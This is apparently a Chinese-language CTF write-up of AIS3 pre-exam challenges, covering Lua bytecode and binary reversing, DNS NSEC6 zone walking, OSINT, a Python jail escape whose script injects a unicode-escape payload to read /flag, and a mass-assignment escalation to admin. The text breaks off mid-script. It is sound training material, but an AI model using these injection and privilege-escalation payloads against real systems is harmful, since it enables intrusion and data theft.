---
title: "AI3 wirteup "
description: "securi"
pubDate: 2024-05-20
tags: ["intro", "security"]
---



# AIS3 pre writeup

# 第一題 金色傳說

這題的核心漏洞在於：後端信任了 client 傳來的 rate 參數，而不是自己在伺服器端重新計算。先看 Unity 反編譯出的 GachaServer.cs (line 66)。在 RollCoroutine() 裡，client 會先產生一個隨機值：
csharp
```
float num = UnityEngine.Random.Range(0f, 0.3f);
```
接著把這個值包進 JSON，送到遠端 gacha server：
csharp
```
string s2 = $"{{\"spend\":{spend},\"rate\":{num:F4}," + "\"username\":\"" + EscapeJson(s) + "\"," + $"\"gold\":{num2},\"score\":{num3},\"kills\":{num4}}}";
```
也就是說，正常遊戲流程裡 rate 只會落在 0.0 ~ 0.3 之間。
## 漏洞分析
既然 rate 是由 client 提供，就可以直接跳過遊戲 UI，手動送 request 到：http://chals1.ais3.org:50001
我先用正常資料測試，確認 API 會回傳 JSON 裝備資料；接著改動 rate 的值做邊界測試。
測試結果如下：
•	0 <= rate <= 0.3：正常掉裝
•	0.3001 <= rate <= 1.0：回傳帶有 flag 的裝甲
•	rate < 0 或 rate > 1.0：回傳 Cheater / Wet Noodle
也就是後端顯然有一段邏輯，把「超出正常範圍但還沒大到被判作弊」的 rate 當成特殊條件處理，直接吐出 flag。
### 利用方式
bash:
```
curl -sS -X POST http://chals1.ais3.org:50001 \ -H 'Content-Type: application/json' \ --data '{"spend":50,"rate":0.5,"username":"test","gold":0,"score":0,"kills":0}'
```
會得到類似回應：
json
{ "weapon": { "name": "Spear I", "damage": 22.8, "maxDurability": 166, "range": 4.0, "angle": 26.0, "cooldown": 0.55, "bonusGoldPercent": 0.0, "lifestealPercent": 0.0 }, "armor": { "name": "AIS3{At_Least_U_DIDNT_MODIFY_MY_MONEY_RIGHT?}", "slot": "Body", "damageReduction": 0.2, "bonusMaxHp": 15, "bonusSpeed": 0 } }
flag 就在 armor.name 裡。
### FLAG
AIS3{At_Least_U_DIDNT_MODIFY_MY_MONEY_RIGHT?}

# 第二題 ㄌㄨㄚˋ
這題給了兩個檔案：
`luac_stripped.exe`
`secret.luac`
看檔案型態後可以先確認：
luac_stripped.exe 是一個自製的 Lua 編譯器 / VM 
secret.luac 是 Lua 5.1 bytecode，但不是標準格式

### 第一步驟
先確認 bytecode 不是標準 Lua 5.1
用 file 跟標準 luac / lua 去測，secret.luac 會報 unexpected end in precompiled chunk，代表它不是普通的 Lua 5.1 bytecode。
檔頭是：
`1b 4c 75 61 51`
也就是 \x1bLuaQ，不是標準的 \x1bLua。
這裡就能猜到：題目故意改了 dump format。
### 第二步驟
逆出自訂 chunk 格式
接著去看 luac_stripped.exe 的 loader / dumper 邏輯，最後可以發現每個 function proto 的 header 比標準 Lua 多了一個欄位：
`source
linedefined
lastlinedefined
nups
seed        <-- 題目額外插入
numparams
is_vararg
maxstacksize`
也就是說這題不是檔案壞掉，而是 每個 proto 多了一個 seed byte
我後來寫了一個python腳本如下：
```
#!/usr/bin/env python3
import struct
import sys
from dataclasses import dataclass, field


OPNAMES = {
    0: "TFORLOOP",
    1: "ADD",
    2: "MOVE",
    3: "UNM",
    4: "LOADK",
    5: "LOADBOOL",
    6: "CONCAT",
    7: "LOADNIL",
    8: "SUB",
    9: "GETUPVAL",
    10: "JMP",
    11: "GETGLOBAL",
    12: "GETTABLE",
    13: "SETGLOBAL",
    14: "SETUPVAL",
    15: "MUL",
    16: "SETTABLE",
    17: "DIV",
    18: "MOD",
    19: "NEWTABLE",
    20: "SELF",
    21: "POW",
    22: "LEN",
    23: "LT",
    24: "TEST",
    25: "LE",
    26: "TESTSET",
    27: "EQ",
    28: "CALL",
    29: "TAILCALL",
    30: "RETURN",
    31: "FORLOOP",
    32: "FORPREP",
    33: "SETLIST",
    34: "CLOSE",
    35: "CLOSURE",
    36: "VARARG",
    37: "NOT",
}


def rk_str(x: int, consts):
    if x & 0x100:
        idx = x & 0xFF
        if 0 <= idx < len(consts):
            return f"K[{idx}]({consts[idx]!r})"
        return f"K[{idx}]"
    return f"R{x}"


@dataclass
class Proto:
    source: bytes | None
    linedefined: int
    lastlinedefined: int
    nups: int
    seed: int
    numparams: int
    is_vararg: int
    maxstacksize: int
    code: list[int] = field(default_factory=list)
    consts: list = field(default_factory=list)
    protos: list["Proto"] = field(default_factory=list)


class Reader:
    def __init__(self, data: bytes):
        self.data = data
        self.i = 12

    def u8(self):
        v = self.data[self.i]
        self.i += 1
        return v

    def u32(self):
        v = struct.unpack_from("<I", self.data, self.i)[0]
        self.i += 4
        return v

    def u64(self):
        v = struct.unpack_from("<Q", self.data, self.i)[0]
        self.i += 8
        return v

    def f64(self):
        v = struct.unpack_from("<d", self.data, self.i)[0]
        self.i += 8
        return v

    def bytes(self, n):
        v = self.data[self.i:self.i+n]
        self.i += n
        return v

    def lstring(self):
        n = self.u64()
        if n == 0:
            return None
        s = self.bytes(n)
        if s.endswith(b"\0"):
            s = s[:-1]
        return s


def parse_proto(r: Reader) -> Proto:
    p = Proto(
        source=r.lstring(),
        linedefined=r.u32(),
        lastlinedefined=r.u32(),
        nups=r.u8(),
        seed=r.u8(),
        numparams=r.u8(),
        is_vararg=r.u8(),
        maxstacksize=r.u8(),
    )
    ncode = r.u32()
    p.code = [r.u32() for _ in range(ncode)]
    nk = r.u32()
    for _ in range(nk):
        t = r.u8()
        if t == 0:
            p.consts.append(None)
        elif t == 1:
            p.consts.append(bool(r.u8()))
        elif t == 3:
            p.consts.append(r.f64())
        elif t == 4:
            s = r.lstring()
            p.consts.append(s.decode("latin1") if s is not None else None)
        else:
            raise ValueError(f"unknown const tag {t} at {r.i:#x}")
    np = r.u32()
    p.protos = [parse_proto(r) for _ in range(np)]
    # debug
    n = r.u32()
    r.i += 4 * n
    n = r.u32()
    for _ in range(n):
        r.lstring()
    n = r.u32()
    r.i += 8 * n
    return p


def decode_inst(raw: int, seed: int, pc: int):
    key = ((seed ^ 0x2B) ^ (17 + 15 * pc)) & 0x3F
    op = (raw & 0x3F) ^ key
    dec = (raw & ~0x3F) | op
    a = (dec >> 6) & 0xFF
    c = (dec >> 14) & 0x1FF
    b = (dec >> 23) & 0x1FF
    bx = dec >> 14
    sbx = bx - 131071
    return dec, op, a, b, c, bx, sbx


def dis_line(p: Proto, idx: int, raw: int):
    _, op, a, b, c, bx, sbx = decode_inst(raw, p.seed, idx)
    name = OPNAMES.get(op, f"OP_{op}")
    if name == "MOVE":
        body = f"R{a} = R{b}"
    elif name == "LOADK":
        body = f"R{a} = K[{bx}] ({p.consts[bx]!r})"
    elif name == "LOADBOOL":
        body = f"R{a} = {bool(b)} ; skip_next={c}"
    elif name == "LOADNIL":
        body = f"R{a}..R{b} = nil"
    elif name == "GETUPVAL":
        body = f"R{a} = UP[{b}]"
    elif name == "GETGLOBAL":
        body = f"R{a} = G[K[{bx}]={p.consts[bx]!r}]"
    elif name == "GETTABLE":
        body = f"R{a} = R{b}[{rk_str(c, p.consts)}]"
    elif name == "SETGLOBAL":
        body = f"G[K[{bx}]={p.consts[bx]!r}] = R{a}"
    elif name == "SETUPVAL":
        body = f"UP[{b}] = R{a}"
    elif name == "SETTABLE":
        body = f"R{a}[{rk_str(b, p.consts)}] = {rk_str(c, p.consts)}"
    elif name == "NEWTABLE":
        body = f"R{a} = {{}} ; fb2int(B)={b}, fb2int(C)={c}"
    elif name == "SELF":
        body = f"R{a+1}=R{b}; R{a}=R{b}[{rk_str(c, p.consts)}]"
    elif name in {"ADD", "SUB", "MUL", "DIV", "MOD", "POW"}:
        sym = {"ADD": "+", "SUB": "-", "MUL": "*", "DIV": "/", "MOD": "%", "POW": "^"}[name]
        body = f"R{a} = {rk_str(b, p.consts)} {sym} {rk_str(c, p.consts)}"
    elif name == "UNM":
        body = f"R{a} = -R{b}"
    elif name == "NOT":
        body = f"R{a} = not R{b}"
    elif name == "LEN":
        body = f"R{a} = #R{b}"
    elif name == "CONCAT":
        body = f"R{a} = concat(R{b}..R{c})"
    elif name == "JMP":
        body = f"pc += {sbx}"
    elif name in {"EQ", "LT", "LE"}:
        opstr = {"EQ": "==", "LT": "<", "LE": "<="}[name]
        body = f"if ({rk_str(b, p.consts)} {opstr} {rk_str(c, p.consts)}) ~= {a} then pc++"
    elif name == "TEST":
        body = f"if truthy(R{a}) == {c} then pc++"
    elif name == "TESTSET":
        body = f"if truthy(R{b}) == {c} then R{a}=R{b} else pc++"
    elif name == "CALL":
        body = f"R{a}(... B={b-1 if b else 'top'} args) -> {c-1 if c else 'top'} rets"
    elif name == "TAILCALL":
        body = f"tailcall R{a} with B={b-1 if b else 'top'} args"
    elif name == "RETURN":
        body = f"return R{a} .. count={b-1 if b else 'top'}"
    elif name == "FORLOOP":
        body = f"numeric for loop, jump {sbx}"
    elif name == "FORPREP":
        body = f"prep numeric for, jump {sbx}"
    elif name == "TFORLOOP":
        body = f"generic for loop, nresults={c}"
    elif name == "SETLIST":
        body = f"setlist base=R{a} count={b} block={c}"
    elif name == "CLOSE":
        body = f"close from R{a}"
    elif name == "CLOSURE":
        body = f"R{a} = closure(proto[{bx}])"
    elif name == "VARARG":
        body = f"R{a}.. = vararg ({b-1 if b else 'top'})"
    else:
        body = f"A={a} B={b} C={c} Bx={bx} sBx={sbx}"
    return f"{idx+1:03d}: {name:<9} A={a:<3} B={b:<3} C={c:<3} | {body}"


def walk(p: Proto, path="0", depth=0):
    ind = "  " * depth
    print(f"{ind}proto {path}: lines {p.linedefined}-{p.lastlinedefined}, seed={p.seed}, nups={p.nups}, params={p.numparams}, vararg={p.is_vararg}, stack={p.maxstacksize}")
    if p.consts:
        print(f"{ind}  consts:")
        for i, k in enumerate(p.consts):
            print(f"{ind}    K[{i}] = {k!r}")
    print(f"{ind}  code:")
    for i, raw in enumerate(p.code):
        print(ind + "    " + dis_line(p, i, raw))
    for i, sub in enumerate(p.protos):
        walk(sub, f"{path}.{i}", depth + 1)


def main():
    if len(sys.argv) != 2:
        print(f"usage: {sys.argv[0]} <secret.luac>", file=sys.stderr)
        raise SystemExit(1)
    with open(sys.argv[1], "rb") as f:
        data = f.read()
    if not data.startswith(b"\x1bLuaQ"):
        print("unexpected header", file=sys.stderr)
    r = Reader(data)
    root = parse_proto(r)
    if r.i != len(data):
        print(f"warning: parser stopped at {r.i:#x}/{len(data):#x}", file=sys.stderr)
    walk(root)


if __name__ == "__main__":
    main()
```
### 3. opcode 有兩層保護
把 chunk parse 出來之後，還不能直接照標準 Lua opcode 讀，因為這題做了兩層混淆。
第一層：opcode low 6 bits 會被 xor
從 `luac_stripped.exe` 的 `luaK_code` 和 `luaV_execute` 
可以逆出公式：
`encoded_op = real_op XOR ((seed XOR 0x2b) XOR (17 + 15*pc))`
所以解密方式就是再 xor 一次同樣的 key。
這裡的 pc 是該 proto 內的 instruction index。
第二層：opcode 編號表被重排就算把 opcode 解密完，編號也不是標準 Lua 5.1 的順序。
例如我從 compiler / VM helper 對出了幾個關鍵 mapping：
`2 = MOVE
4 = LOADK
7 = LOADNIL
9 = GETUPVAL
10 = JMP
11 = GETGLOBAL
12 = GETTABLE
16 = SETTABLE
19 = NEWTABLE
28 = CALL
30 = RETURN
35 = CLOSURE
37 = NOT
`
把這些 mapping 補齊後，就能把 secret.luac 反組譯成人能看的指令。
### 4. 主程式在做什麼
主 proto 邏輯很簡單，大致是：
建立幾個 helper closure
io.write("> ")
io.read() 讀輸入
呼叫最後的 checker function
成功印 ok，失敗印 no
所以真正關鍵在最後那個 checker proto
### 5. 三個核心 helper
反組譯後可以看出最後的 checker 用到三個重要 helper。
 **(a)第一個 helper：其實是 XOR**
一開始這個函式看起來很繞，但把 EQ/LT 配合下一條 JMP 的語義看正確後，會發現它其實是在逐 bit 重建結果：
```
f(a, b) = a xor b
```
**(b) 第二個 helper：線性轉換**
另一個 helper 會把陣列每個元素做固定轉換：
```
out[i] = (arr[i] - p1 - ((i * p2) % p3)) % 256
```
**(c)第三個 helper：交錯 merge**
還有一個 helper 會把兩個陣列交錯合併：
```
a1, b1, a2, b2, a3, b3, ...
```
這個在 proto 裡是利用 i % 2 判斷奇偶位置完成的。
**6. 兩個常數表**
`secret.luac` 裡藏了兩組數字，分別在兩個 proto 常數裡。

第一組：
```
83, 102, 79, 57, 207, 142, 140, 252, 144, 116, 68
```
第二組：
```
186, 199, 186, 148, 16, 111, 106, 113, 66, 185, 41, 97, 192, 105, 232, 127, 67,
74, 49, 254, 98, 21, 85, 158, 184, 93, 177, 102, 248, 33, 39, 30, 30
```
它們會先經過「交錯 merge + 線性轉換」，變成 checker 真正使用的兩張表。
**7. 最後的 checker**
最後的 checker 對輸入每一個 byte 做驗證。整理之後可以化成：
```
state = 65
for i in 1..N:
    x = table1[(i*5 + state) % len(table1)]
    z = ((((input[i] + i + state) % 256) XOR ((x + i*7) % 256)) + ((x XOR i) % 13)) % 256
    require(z == table2[i])
    state = (state + z + x + i*3) % 25ˊ
```
因為每一輪的 table2[i]、state、x 都已知，所以可以直接反推 input[i]。
而且每一位都只有唯一解。
**8. 直接反推結果**
把每一位反推回去後，得到完整輸入：

```
AIS3{Lu4_0pc0d3_Shuffl1ng_1s_Fun}
```
我也用本地腳本驗證過，這串輸入會讓 checker 完整通過。

# 第三題 welcome
首先點進去https://ais32026scanme.pwn2ooown.tech/ 後可以發現是有一個一直改變的qr code
用手機掃描過後會進到https://qrss.netlify.app
這個網站，透過這個網站繼續掃描qr code後會得到一張圖片
![IMG_1917](https://hackmd.io/_uploads/SJSnrIvJGx.jpg)
從圖片中可以發現flag就是`AIS3{Hello_LLM_welcome_to_pre_exam_2026!}`
# 第四題 想在學中來杯下午茶嗎？
首先把檔案下載下來會發現有一張圖片
![截圖 2026-05-18 上午10.34.22](https://hackmd.io/_uploads/BkDqeZOJMl.png)

在圖片中可以發現右邊的白色牌子有豐鄉盯的字樣，再看到右邊白色牌子有上枝3號的字樣
![截圖 2026-05-18 上午11.13.04](https://hackmd.io/_uploads/HJ3-N-d1fg.png)

透過這些資訊我到google map找到了
類似的場景透過網址上面經緯度可以得知flag是`AIS3{35.193-136.226}`
# 第五題 jali
先看題目給了一個程式碼
```

#flag is at /flag

from flask import Flask,request,send_file
import os,time,uuid,unicodedata

app = Flask(__name__)

shebang = '#!/usr/local/bin/python3'

@app.route('/')
def index(): return send_file(__file__)

@app.post('/<uid>')
def run(uid):
    uuid.UUID(uid)
    d = unicodedata.normalize("NFKC", request.data.decode())
    assert not any(i in d for i in "()_[]{}.@#")
    open(f"data/{uid}","w").write(shebang + d)
    os.chmod(f"data/{uid}", 0o755)
    os.popen(f"./data/{uid} > ./output/{uid}")
    time.sleep(1)
    r = open(f"output/{uid}","r").read()
    return r

if __name__ == "__main__":
    app.run("0.0.0.0",port=8000)

```
透過觀察上面的程式碼，這題的目標很明確：Flag 躺在 /flag，我們需要透過發送 POST 請求到 /<uid>，設法執行 Python 程式碼來讀取這個檔案。
### 原始碼分析
程式碼中的uuid.UUID(uid) 確保你路徑上的 uid 必須是合法的 UUID 格式（例如 12345678-1234-5678-1234-567812345678），這部分沒辦法塞壞東西。
```
assert not any(i in d for i in "()_[]{}.@#")
```
透過上面的程式碼可以發現
出題者禁用了大括號、中括號、小括號、點、底線等。這意味著在 Python 裡，你**完全無法呼叫任何函式**（因為沒有 `()`），也**無法存取任何屬性或模組方法**（因為沒有 `.`），更**無法定義函式或看變數**（因為沒有 `_`）。
接下來我發現了下方那串程式碼
```
d = unicodedata.normalize("NFKC", request.data.decode())
```
在這串程式碼我發現了程式在檢查黑名單之前，先使用了 NFKC（相容特性組合）進行 Unicode 正規化。
在知道漏洞點後我寫了一個腳本
```
import requests
import uuid
TARGET_URL = "http://chals1.ais3.org:10001"
uid = str(uuid.uuid4())
vuln_url = f"{TARGET_URL}/{uid}"

payload = " -Xcoding:unicode-escape\nprint\\x28open\\x28'/flag'\\x29\\x2eread\\x28\\x29\\x29"

print(f"[*] 正在產生隨機 UID: {uid}")
try:
    response = requests.post(vuln_url, data=payload.encode('utf-8'))
    
    print("\n伺服器回傳結果：")
    print("-" * 50)
    print(response.text.strip())
    print("-" * 50)

except Exception as e:
    print(f"[!] 發生錯誤: {e}")
```
通過執行腳本後即可獲得    flag`AIS3{5H3_BA_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_NG!}
`
# 第六題Jail Revenge
先看題目給了一串程式碼
```
#flag is at /flag

from flask import Flask,request,send_file
import os,time,uuid,unicodedata

app = Flask(__name__)

shebang = '#!/usr/local/bin/python3'

@app.route('/')
def index(): return send_file(__file__)

@app.post('/<uid>')
def run(uid):
    uuid.UUID(uid)
    d = unicodedata.normalize("NFKC", request.data.decode())
    assert not any(i in d for i in "()_[]{}.@#") and len(d.split("\n")[0]) < 50
    open(f"data/{uid}","w").write(shebang + d)
    os.chmod(f"data/{uid}", 0o755)
    os.popen(f"./data/{uid} > ./output/{uid}")
    time.sleep(1)
    r = open(f"output/{uid}","r").read()
    return r

if __name__ == "__main__":
    app.run("0.0.0.0",port=8000)
```
仔細看跟上一題不同的地方是出題者唯一修改的地方，就是在 assert 檢查裡多加了這個條件                         `and len(d.split("\n")[0]) < 50`                 
這句的意思是：你傳進去的 Payload，第一行（也就是第一段到換行符號 \n 為止的部分）長度不能超過 50 個字元
可是我上一題寫的腳本包含空格才24字元所以我可以沿用上一題的腳本只是把port號改一下就好，腳本如下
```
import requests
import uuid
TARGET_URL = "http://chals1.ais3.org:10002"   
uid = str(uuid.uuid4())
vuln_url = f"{TARGET_URL}/{uid}"

payload = " -Xcoding:unicode-escape\nprint\\x28open\\x28'/flag'\\x29\\x2eread\\x28\\x29\\x29"

print(f"[*] 正在產生隨機 UID: {uid}")
try:
    response = requests.post(vuln_url, data=payload.encode('utf-8'))
    
    print("\n伺服器回傳結果：")
    print("-" * 50)
    print(response.text.strip())
    print("-" * 50)

except Exception as e:
    print(f"[!] 發生錯誤: {e}")
```
# 第七題 Mass Rapid Transit 
題目給了一個網站進去之後會發現他是一個捷運的官網，且有註冊以登入功能，在此猜測此網站很有可能有管理員後台
首先我註冊了一個帳號
![截圖 2026-05-18 中午12.44.21](https://hackmd.io/_uploads/By2VFMOyfx.png)
可以看到我的身份為訪客，所以我把url的路徑改了一下，改成admin會出現以下結果證實我一開始的猜測是對的
![截圖 2026-05-18 下午1.29.41](https://hackmd.io/_uploads/HJ7J4XdJGg.png)
那從上面得知有admin後台
在得知有後台的情況下，我先看前端的代碼發現了表單是post請求
![截圖 2026-05-18 下午1.37.21](https://hackmd.io/_uploads/H1o6S7_yGx.png)
在得知這個頁面的前端是post請求，那就代表我可以發送post請求
![截圖 2026-05-18 下午1.41.38](https://hackmd.io/_uploads/Hki28XO1fg.png)
在常用車站後 || user[role] 帶1(ture) 輸入框卻返回 {" || user[role]"=>"1"}  這邊發現不能正確解析，所以我把user[favorite_station]改成user[role]，輸入框輸入adminuser[favorite_station]改成user[role]，輸入框輸入admin 然後我把它送出就成功進到管理員後台
![截圖 2026-05-18 下午1.49.00](https://hackmd.io/_uploads/BytOO7OkMe.png)
這樣就成功進到管理員後台，通過管理員後台可以看到flag：`AIS3{R41ls_4P1_M4ss_4ss1gnm3nt_2_AIS_4dm1n}
`
# 第八題 DG server
首先這題給了兩個檔案：
`dg-server`
`dg-verify.py`
首先觀察題目給的驗證方式是：
```
python3 dg-verify.py @chals1.ais3.org:53573 www.curious.sleeping A
```
但這只會驗到公開的 A 記錄，不會直接給 flag。
所以我先直接查遠端，可以知道這不是普通 DNS，而是 HTTP 形式的 DoH-like 查詢：已知公開記錄有：
```
www.curious.sleeping. A 67.67.67.67
api.curious.sleeping. A 73.31.13.37
ftp.curious.sleeping. A 67.76.67.76
mail.curious.sleeping. A 13.37.73.31
ns1.curious.sleeping. A 13.37.73.31
```
以及公開 TXT：
```
curious.sleeping. TXT "v=spf1 mx -all"
_dmarc.curious.sleeping. TXT "v=DMARC1; p=none; rua=mailto:hostmaster@curious.sleeping"
status.curious.sleeping. TXT "service=ok; region=moon"
```
接著可以發現 server 支援自訂的 NSEC6。
利用 NXDOMAIN 回應可以一路把整條 NSEC6 鏈 walk 完，最後發現還有一筆未知 TXT 對應到：
```
S6NPJID2K4SNE7AB754D34I8IK3E8TKJ.curious.sleeping.
```
根據我的判斷也就是說 flag 很可能藏在這筆隱藏 TXT。
再來我看看 `dg-server` 後，可以確認：NSEC6 是自製格式，不是標準 NSEC3
base32 alphabet 是：
```
0123456789ABCDEFGHIJKLMNOPQRSTUV
```
salt 是：
```
73311337
```
我寫一個python腳本如下：
```
from __future__ import annotations

from dataclasses import dataclass

ALPHA = "0123456789ABCDEFGHIJKLMNOPQRSTUV"

def rol32(x: int, r: int) -> int:
    x &= 0xFFFFFFFF
    return ((x << r) | (x >> (32 - r))) & 0xFFFFFFFF

def normalize_name(name: str) -> str:
    name = name.strip().lower()
    if not name:
        return "."
    if name != "." and not name.endswith("."):
        name += "."
    return name


def first_label_blob(name: str) -> bytes:
    name = normalize_name(name)
    out = bytearray(20)
    if name == "." or not name:
        return bytes(out)
    dot = name.find(".")
    n = len(name) if dot < 0 else dot
    if n > 19:
        n = 19
    out[0] = n
    out[1 : 1 + n] = name[:n].encode()
    return bytes(out)

def derive20(name: str, key2: bytes) -> bytes:
    assert len(key2) == 20
    name = normalize_name(name).encode()
    state = key2[0] ^ 0x365F6D69
    for i, c in enumerate(name):
        state ^= c
        state = rol32((state * 0x045D9F3B) & 0xFFFFFFFF, 7)
        state = (state + key2[(c + i) % 20]) & 0xFFFFFFFF
    out = bytearray(20)
    for i in range(20):
        state ^= (i - 0x61C88647) & 0xFFFFFFFF
        state = rol32((state * 0x7FEB352D) & 0xFFFFFFFF, 9)
        out[i] = (state >> ((i & 3) * 8)) & 0xFF
    return bytes(out)

def add20(a: bytes, b: bytes) -> bytes:
    assert len(a) == len(b) == 20
    carry = 0
    out = bytearray(20)
    for i in range(19, -1, -1):
        v = a[i] + b[i] + carry
        out[i] = v & 0xFF
        carry = v >> 8
    return bytes(out)

def transform20(buf: bytes, key2: bytes, seed: int = 9) -> bytes:
    assert len(buf) == len(key2) == 20
    rounds = (seed & 7) + 8
    work = bytearray(buf)
    for r in range(rounds):
        work[:] = work[-1:] + work[:-1]
        for i in range(20):
            work[i] ^= key2[(r + i) % 20]
            work[i] = (work[i] + r * 17 + i) & 0xFF
    return bytes(work)

def b32hex_encode(raw: bytes) -> str:
    acc = 0
    bits = 0
    out: list[str] = []
    for b in raw:
        acc = (acc << 8) | b
        bits += 8
        while bits > 4:
            bits -= 5
            out.append(ALPHA[(acc >> bits) & 0x1F])
    if bits:
        out.append(ALPHA[(acc << (5 - bits)) & 0x1F])
    return "".join(out)


def b32hex_decode(text: str) -> bytes:
    acc = 0
    bits = 0
    out = bytearray()
    for ch in text:
        acc = (acc << 5) | ALPHA.index(ch)
        bits += 5
        if bits >= 8:
            bits -= 8
            out.append((acc >> bits) & 0xFF)
    return bytes(out)

def nsec6_hash(name: str, key1: bytes, key2: bytes) -> str:
    d = bytearray(derive20(name, key2))
    for i in range(20):
        d[i] |= key1[i]
    s = add20(bytes(d), first_label_blob(name))
    t = transform20(s, key2, 9)
    return b32hex_encode(t)

KNOWN = {
    "curious.sleeping.": "H46HSBFKHOSNE78MEU8JB18JA7N4IUGI",
    "api.curious.sleeping.": "H46HSBFKHOSNE79276V7EUQ3RFHKIUGI",
    "ns1.curious.sleeping.": "H46HSBFKHOSNE79289JNUUQ3RFHKIUGI",
    "ftp.curious.sleeping.": "H46HSBFKHOSNE792DA5FGUQ3RFHKIUGI",
    "www.curious.sleeping.": "H46HSBFKHOSNE792RC9U2UQ3RFHKIUGI",
    "mail.curious.sleeping.": "H46HSBFKHOSNE79FQM2ND3Q3RFHKIUGI",
    "_dmarc.curious.sleeping.": "H46HSBFKHOSNE7FP2CD05BFU13HKIUGI",
    "status.curious.sleeping.": "H46HSBFKHOSNE7FP4U5AT4KL73HKIUGI",
}

if __name__ == "__main__":
    for k, v in KNOWN.items():
        print(k, b32hex_decode(v).hex())
``` 
為了驗證逆出來的邏輯，我先讓本地的 dg-server 真正跑起來。因為可以用真 binary 當 oracle 校正演算法。
我先逆出 config / db / key 格式：   
`dg.conf` 形狀是：
```
zone "test."
file "test.db"
key "testkey"
}
```
`test.db` 可以用類似簡化 zone-file 的格式，例如：
```
@ SOA ns1.test. hostmaster.test. 2026040101 3600 600 604800 60
@ NS ns1.test.
ns1 A 127.0.0.1
@ TXT "hello"
```
而 key 檔格式最後也逆出來了，必須是：
```
PRIVATEKEY 257 15 <64 hex chars>
PRIVATEKEY 256 15 <64 hex chars>
```
其中：
`257` = KSK
`256` = ZSK
`15` = Ed25519
後面是 `32-byte seed` 的 hex
有了這些之後，本地 server 就能真的起來，並正確生成 NSEC6
再來我要還原 NSEC6 流程NSEC6 owner 的生成流程可以拆成幾步。
(a) 4053ef：從 DNSKEY 算出 zone 狀態
這一步會算出兩個 20-byte 值，我叫它：
`k1`
`k2`
重點是：這兩個值只需要 zone name、serial、公開 DNSKEY 資料就能重建。也就是說，不需要私鑰。在本地驗證後，4053ef Python 化可以和 process memory 100% 對上。

(b) 只取 owner 第一層 label
函式 40532f 不會吃完整 FQDN，而是只取第一層 label，例如：`status.curious.sleeping.` -> `status_dmarc.curious.sleeping.` -> `_dmarc`
然後做成 20-byte blob：
第 0 byte = 長度
後面放 label bytes
最多 19 bytes
`(c) 405626 + 40588c + 405756 + 405909`
整體流程是：
用完整 owner name 和 k2 算一個 20-byte 值
把它和 k1 做 OR，再和「第一層 label blob」做 20-byte big-endian 加法，經過 9 輪 transform，最後 base32hex 編碼，其中我一開始卡最久的是 `405756`。
後來用本地 zone 驗證才發現，那一步不是整段 reverse，而是每輪把 20-byte buffer 向右輪轉 1 byte，接著再 xor / add。這也是前面一直對不起來的主因。
接著我把遠端 `curious.sleeping`. 的公開 DNSKEY 帶進 4053ef 後，可以直接算出：
```
k1 = ffffffffffffffffffffffffffffffffffffffff
k2 = 7226efeef666f4e87fef3efc136c57f3ec92de2b
```
這是整題最大的突破點。因為 k1 全都是 0xff，所以在後面的流程中：    
```
derived[i] | k1[i] = 0xff
```
也就是說那一步直接退化成常數，未知 owner 幾乎只剩下「第一層 label blob」在影響結果。
目標未知 `NSEC6 hash` 是：
```
S6NPJID2K4SNE7AB754D34I8IK3E8TKJ
```
因為現在 k1 和 k2 都已知，所以可以：先把 base32hex decode 回 20 bytes，逆掉 405756，逆掉加法取回原本的第一層 label blob
最後我反推出：
```
azft0azxct7utcyw
```
也就是未知 owner 是：    
```
azft0azxct7utcyw.curious.sleeping.
```
再來直接查這筆 TXT：    
```
curl -s 'http://chals1.ais3.org:53573/dns-query?name=azft0azxct7utcyw.curious.sleeping.&type=TXT'
```
回應：
```
azft0azxct7utcyw.curious.sleeping. TXT "AIS3{w4lking_0n_D0H_z0n3--NSEC...NSEC6!_666~~~}"
```
Flag:`AIS3{w4lking_0n_D0H_z0n3--NSEC...NSEC6!_666~~~}`
# 第九題 tetris，簡單
首先題目給了一個`tetris`的檔案，我先檢查檔案格式：`objdump -f tetris` 結果是：
```
file format elf64-x86-64
architecture: i386:x86-64
start address 0x404550
```
再用 strings 找可疑字串：   
```
strings -a -n 4 tetris | Select-String "flag|ctf|score|Score|Tetris|Game|Lines"
```    
看到： 
```
[1;36mTETRIS - Score: %d | Lines: %d
Game Over! Final Score: %d
Lines Cleared: %d
```
代表它確實有分數和清行數。
再來我用`objdump`找這些字串的交叉引用，會看到渲染畫面時讀兩個全域變數
```
15c2131: mov edx, DWORD PTR [rip+0x4e6879]  # 0x1aa89b0
15c2137: mov eax, DWORD PTR [rip+0x4e686f]  # 0x1aa89ac
```    
所以：    
```
0x1aa89ac = score
0x1aa89b0 = lines cleared
```    
清行加分邏輯在附近：  
```
15c2e79: mov eax, DWORD PTR [0x1aa89b0]
15c2e81: mov DWORD PTR [0x1aa89b0], eax

15c2e87: mov eax, DWORD PTR [0x1aa8a1c]
15c2e8d: imul edx, eax, 0x64
15c2e90: mov eax, DWORD PTR [0x1aa89ac]
15c2e96: add eax, edx
15c2e98: mov DWORD PTR [0x1aa89ac], eax
```    
也就是：
```
lines += cleared_lines;
score += cleared_lines * 100;
```
雖然strings 沒有直接出現 flag，所以往可疑輸出函式追。找到一段會把某個 buffer 印出來：
```
15c3238: lea rax, [rip+0x174119]  # 0x1737358
15c323f: mov rdi, rax
15c3247: call printf
```    
這段之前有兩個關鍵函式：
```
15c312f: lea rax, [rip+0x1740aa]  # 0x17371e0
15c3139: call 0x15c1a6e

15c3154: mov edx, 0x1c
15c3159: lea rax, [rip+0x4e2fd0]  # 0x1aa6130
15c316d: call memcpy

15c31ef: mov ecx, 0x18
15c31fe: mov esi, 0x1c
15c320d: call 0x15c1c61
```
意思是：    
```
key = make_key(pattern_table);
memcpy(cipher, data_1aa6130, 0x1c);
rc4_like_decrypt(cipher, 0x1c, key, 0x18);
printf("%s", cipher);
```    
再來還原key產生，0x15c1a6e 先對 0x17371e0 的 40 個 int 做 FNV-like hash    
```
uint32_t h = 0x811c9dc5;

for (int i = 0; i < 4; i++) {
    for (int j = 0; j < 10; j++) {
        h ^= pattern[i][j];
        h *= 0x1000193;
    }
}
```    
接著產生 24 bytes key：    
```
for (int i = 0; i < 24; i++) {
    key[i] = (h >> ((i % 4) * 8)) & 0xff;
    h = (h * 0x41c64e6d + 0x3039) & 0x7fffffff;
}
```
解密 flag    
密文在 `.data`：    
```
0x1aa6130:
2e a5 56 46 0d 7c 8e dc 83 6f 30 83 ff f8 a5 5c
d0 76 d8 cd 99 dc 3f 39 9d 65 70 64
```  
用 Python 重做演算法：
```
import struct

pattern_hex = """
05000000 00000000 05000000 00000000
01000000 00000000 04000000 04000000
